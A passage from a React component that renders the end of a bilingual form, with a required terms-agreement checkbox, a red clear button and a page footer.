                onChange={(e) => setAgreeTerms(e.target.checked)}
                style={{ width: 18, height: 18 }}
              />
              <label style={{ fontSize: 14, color: '#333' }}>
                <span style={{ color: 'red' }}>*</span> {t.agreeTerms}{' '}
                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: '#1076BB', textDecoration: 'underline' }}>{t.termsLink}</a>
              </label>
            </div>
            <button
              onClick={handleClear}
              style={{
                background: '#d32f2f', color: '#fff', border: 'none', padding: '10px 50px',
                fontSize: 15, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                fontFamily: isEnglish ? 'Arial, sans-serif' : 'Cairo, Tahoma, Arial, sans-serif',
              }}
            >
              {t.clearBtn}
            </button>
          </div>
        </div>
        )}
      </div>

      {/* Footer */}
      <div style={{ textAlign: 'center', padding: '12px 0', background: '#000', marginTop: 'auto' }}>
        <p style={{ color: '#fff', fontSize: 13, margin: 0 }}>{t.footer}</p>
      </div>
    </div>
  );
}
